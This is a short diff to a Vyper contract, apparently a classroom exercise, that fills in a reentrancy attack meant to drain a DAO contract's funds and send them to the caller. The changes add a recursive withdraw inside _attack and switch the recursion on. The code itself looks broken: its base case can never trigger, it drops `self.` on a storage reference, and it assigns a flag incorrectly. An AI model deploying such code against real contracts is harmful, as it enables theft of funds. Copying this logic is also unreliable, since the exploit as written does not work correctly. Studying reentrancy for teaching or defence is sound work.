@@ -5,6 +5,7 @@ interface DAO:
 
 dao_address: public(address)
 owner_address: public(address)
+is_attack: public(bool)
 
 @external
 def __init__():
@@ -19,6 +20,7 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
     if(self.dao_address.balance < 0):
         return False
+    DAO(dao_address).withdraw(value=100)
 
     return True
 
@@ -35,10 +37,11 @@ def attack(dao_address:address):
     # TODO: make the deposit into the DAO
     DAO(dao_address).deposit(value=deposit_amount)
     
+    is_attack = True
     # TODO: Start the reentrance attack
-    #if(self._attack == True):
+    if(is_attack == True):
         #_attack = false
-        #self._attack()
+        self._attack()
 
     # TODO: After the recursion has finished, send all funds (deposited and stolen) to the sender
     send(msg.sender, self.balance)
